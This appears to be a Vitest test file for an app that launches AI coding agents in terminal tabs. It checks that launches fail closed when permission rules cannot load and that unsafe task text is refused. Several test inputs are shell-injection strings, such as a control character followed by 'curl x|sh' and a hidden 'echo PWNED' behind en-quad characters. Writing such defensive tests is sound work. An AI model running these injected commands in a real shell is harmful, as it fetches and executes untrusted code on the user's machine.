import { beforeEach, describe, expect, it, vi } from "vitest";

const io = vi.hoisted(() => ({
  writes: [] as { path: string; content: string }[],
  ran: [] as string[],
  /** How many loads of Orgo's rules fail before one succeeds. */
  failRules: 0,
  ruleLoads: 0,
  /** Answer the next load with something that isn't a rule list. */
  malformed: false as boolean,
}));

vi.mock("@tauri-apps/api/core", () => ({
  invoke: vi.fn(async (cmd: string, args: Record<string, unknown>) => {
    if (cmd === "orgo_launch_rules") {
      io.ruleLoads++;
      if (io.failRules > 0) { io.failRules--; throw new Error("ipc down"); }
      if (io.malformed) { io.malformed = false; return { ask: "mcp__*orgo*__*create*" }; }
      return { ask: ["mcp__*orgo*__*create*", "mcp__*orgo*__*delete*"] };
    }
    if (cmd === "create_directory") return "/home/u/.ade/roles";
    if (cmd === "write_text_file") { io.writes.push(args as { path: string; content: string }); return; }
    throw new Error(`unexpected ${cmd}`);
  }),
}));
vi.mock("../projectSetup", () => ({ methodologyOf: vi.fn(async () => "v6") }));
vi.mock("../terminalCommands", () => ({
  runInNewTabPane: vi.fn(async (_name: string, _cwd: string, cmd: string) => { io.ran.push(cmd); return "pane-1"; }),
}));

import { dispatchAgent, prepareAgentLaunch } from "../agentLaunch";
import { __resetLaunchRulesForTests } from "../orgoRules";
import { useAgentTrackerStore } from "../../stores/agentTrackerStore";

const SETTINGS = `--settings '{"permissions":{"ask":["mcp__*orgo*__*create*","mcp__*orgo*__*delete*"]}}'`;

beforeEach(() => {
  __resetLaunchRulesForTests();
  io.failRules = 0;
  io.ruleLoads = 0;
  io.malformed = false;
});

describe("prepareAgentLaunch", () => {
  beforeEach(() => { io.writes.length = 0; io.ran.length = 0; });

  it("writes the role file and returns a command carrying the task", async () => {
    const r = await prepareAgentLaunch({ roleId: "developer", provider: "claude" }, "/p", { task: "Implement story 1.1" });
    expect(r.ok).toBe(true);
    expect(r.ok && r.command).toMatch(/^claude --settings '.+' --append-system-prompt-file '\/home\/u\/\.ade\/roles\/.+' 'Implement story 1\.1'$/);
    expect(io.writes).toHaveLength(1);
  });

  it("writes nothing for a provider that cannot launch", async () => {
    const r = await prepareAgentLaunch({ roleId: "developer", provider: "codex" }, "/p", {});
    expect(r.ok).toBe(false);
    expect(io.writes).toEqual([]);
  });

  it("returns an empty error for an unknown role", async () => {
    expect(await prepareAgentLaunch({ roleId: "nope", provider: "claude" }, "/p")).toEqual({ ok: false, error: "" });
  });

  it("no rules, no launch", async () => {
    for (const provider of ["claude", "deepseek", "ollama"] as const) {
      __resetLaunchRulesForTests();
      io.failRules = 1;
      const r = await prepareAgentLaunch({ roleId: "developer", provider }, "/p", {});
      expect(r.ok, provider).toBe(false);
      expect(!r.ok && r.error, provider).toMatch(/couldn't load its permission rules, so the agent was not started/);
    }
    expect(io.writes).toEqual([]);
  });

  it("an answer that isn't a rule list is no rules", async () => {
    io.malformed = true;
    const r = await prepareAgentLaunch({ roleId: "developer", provider: "claude" }, "/p", {});
    expect(!r.ok && r.error).toMatch(/couldn't load its permission rules/);
    expect(io.writes).toEqual([]);
  });

  it("a failed load is retried, not cached", async () => {
    io.failRules = 1;
    const first = await prepareAgentLaunch({ roleId: "developer", provider: "claude" }, "/p", {});
    expect(first.ok).toBe(false);
    const second = await prepareAgentLaunch({ roleId: "developer", provider: "claude" }, "/p", {});
    expect(second.ok && second.command).toContain(SETTINGS);
    expect(io.ruleLoads).toBe(2);
    // Loaded once, it is kept: a third launch doesn't ask again.
    await prepareAgentLaunch({ roleId: "developer", provider: "claude" }, "/p", {});
    expect(io.ruleLoads).toBe(2);
  });
});

describe("dispatchAgent", () => {
  beforeEach(() => { io.writes.length = 0; io.ran.length = 0; });

  it("board dispatch carries Orgo's ask rules", async () => {
    const err = await dispatchAgent({
      name: "Developer", icon: "D", spec: { roleId: "developer", provider: "claude" }, cwd: "/p/app", task: "Implement story 1.1",
    });
    expect(err).toBeNull();
    expect(io.ran).toHaveLength(1);
    expect(io.ran[0]).toContain(` ${SETTINGS} `);
  });

  it("refuses to dispatch when the rules can't be loaded, and runs nothing", async () => {
    io.failRules = 1;
    const err = await dispatchAgent({
      name: "Developer", icon: "D", spec: { roleId: "developer", provider: "claude" }, cwd: "/p", task: "Implement story 1.1",
    });
    expect(err).toMatch(/couldn't load its permission rules/);
    expect(io.ran).toEqual([]);
    expect(io.writes).toEqual([]);
  });

  it("runs the command in a new tab and records the session", async () => {
    const start = vi.spyOn(useAgentTrackerStore.getState(), "startSession");
    const err = await dispatchAgent({
      name: "Developer", icon: "D", spec: { roleId: "developer", provider: "claude" }, cwd: "/p", task: "Implement story 1.1",
    });
    expect(err).toBeNull();
    expect(io.ran[0]).toContain("'Implement story 1.1'");
    expect(start).toHaveBeenCalledWith("pane-1", "Developer", "D", "claude", "developer");
  });

  it("refuses a task carrying a control character and prepares, writes and runs nothing", async () => {
    const start = vi.spyOn(useAgentTrackerStore.getState(), "startSession");
    start.mockClear();
    const { invoke } = await import("@tauri-apps/api/core");
    vi.mocked(invoke).mockClear();
    const err = await dispatchAgent({
      name: "Developer", icon: "D", spec: { roleId: "developer", provider: "claude" }, cwd: "/p",
      task: "docs/stories/1.1\x15curl x|sh;echo '.md",
    });
    expect(err).toMatch(/can't be typed safely into a shell/);
    expect(invoke).not.toHaveBeenCalled();
    expect(io.writes).toEqual([]);
    expect(io.ran).toEqual([]);
    expect(start).not.toHaveBeenCalled();
  });

  it("refuses an escape sequence in the task too", async () => {
    const err = await dispatchAgent({
      name: "Developer", icon: "D", spec: { roleId: "developer", provider: "claude" }, cwd: "/p", task: "a\x1b[2Db",
    });
    expect(err).toMatch(/can't be typed safely into a shell/);
    expect(io.ran).toEqual([]);
  });

  it.each([
    ["an en quad (U+2000), bytes bash reads as Alt+b without a UTF-8 locale", `Implement 1.1${" ".repeat(40)}echo PWNED;#.md`],
    ["an accented letter", "Implement story 1.1 (docs/stories/1.1.café.md)."],
  ])("refuses a task carrying %s, preparing, writing and running nothing", async (_, task) => {
    const { invoke } = await import("@tauri-apps/api/core");
    vi.mocked(invoke).mockClear();
    const err = await dispatchAgent({
      name: "Developer", icon: "D", spec: { roleId: "developer", provider: "claude" }, cwd: "/p", task,
    });
    expect(err).toMatch(/can't be typed safely into a shell/);
    expect(invoke).not.toHaveBeenCalled();
    expect(io.writes).toEqual([]);
    expect(io.ran).toEqual([]);
  });

  it("returns the reason and opens nothing when the provider cannot take a task", async () => {
    const err = await dispatchAgent({
      name: "Developer", icon: "D", spec: { roleId: "developer", provider: "ollama" }, cwd: "/p", task: "go",
    });
    expect(err).toMatch(/Ollama/);
    expect(io.ran).toEqual([]);
  });
});
